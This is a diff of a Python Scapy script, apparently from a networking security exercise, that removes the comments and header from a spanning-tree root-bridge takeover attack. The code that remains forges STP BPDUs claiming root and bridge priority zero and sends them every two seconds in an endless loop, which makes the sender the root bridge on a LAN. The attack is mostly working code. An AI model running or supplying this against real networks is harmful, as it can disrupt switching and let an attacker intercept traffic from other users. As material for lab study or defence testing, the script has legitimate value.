@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# Script: JordyRosario_20250737_STP_Claim_Root.py
 
 import sys
 import time
@@ -16,13 +15,10 @@ def lanzar_stp_root_claim(interfaz):
     
     try:
         while True:
-            # 1. Capa Ethernet
             capa_ethernet = Ether(dst=mac_multicast_stp, src=get_if_hwaddr(interfaz))
             
-            # 2. Capa LLC requerida por el estándar 802.1D
             capa_llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
             
-            # 3. Capa STP: rootid=0 y bridgeid=0 garantizan la máxima prioridad
             capa_stp = STP(
                 bpdutype=0x00, 
                 bpduflags=0x00, 
@@ -35,10 +31,8 @@ def lanzar_stp_root_claim(interfaz):
             
             paquete_bpdu = capa_ethernet / capa_llc / capa_stp
             
-            # Enviar paquete
             sendp(paquete_bpdu, iface=interfaz, verbose=False)
             
-            # STP requiere que los BPDUs se envíen cada 2 segundos (Hello Time)
             time.sleep(2)
             
     except KeyboardInterrupt:
